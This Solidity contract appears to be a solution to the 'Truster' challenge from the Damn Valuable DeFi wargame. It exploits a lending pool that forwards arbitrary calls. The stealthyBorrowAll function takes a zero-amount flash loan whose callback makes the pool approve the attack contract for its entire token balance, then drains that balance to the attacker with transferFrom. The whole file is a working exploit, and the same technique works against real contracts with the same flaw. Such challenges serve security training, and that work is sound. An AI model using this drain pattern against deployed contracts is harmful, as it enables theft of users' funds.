
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../../contracts/truster/TrusterLenderPool.sol";
import "../../contracts/DamnValuableToken.sol";

contract TrusterLenderAttack {

    using Address for address;

    DamnValuableToken public immutable token;
    TrusterLenderPool private immutable pool;
    address private attacker;

    constructor(address tokenAddress,
                address poolAddress) {
        token = DamnValuableToken(tokenAddress);  
        pool = TrusterLenderPool(poolAddress);
        attacker = msg.sender;
    }


    function kindlyReturn(uint256 borrowedAmount) external {
        token.transfer(address(pool), borrowedAmount);
    }

    function kindlyBorrow(uint256 amount) public {

        pool.flashLoan(
            amount, 
            address(this), 
            address(this), 
            abi.encodeWithSignature("kindlyReturn(uint256)", amount) 
        );
    }
 
    function stealthyBorrowAll() public {
        // address attacker = msg.sender;
        uint balance = token.balanceOf(address(pool));
        pool.flashLoan(
            0, 
            msg.sender, // doesn't matter 
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this), balance)
        );
        token.transferFrom(address(pool), attacker, balance);
    }
}
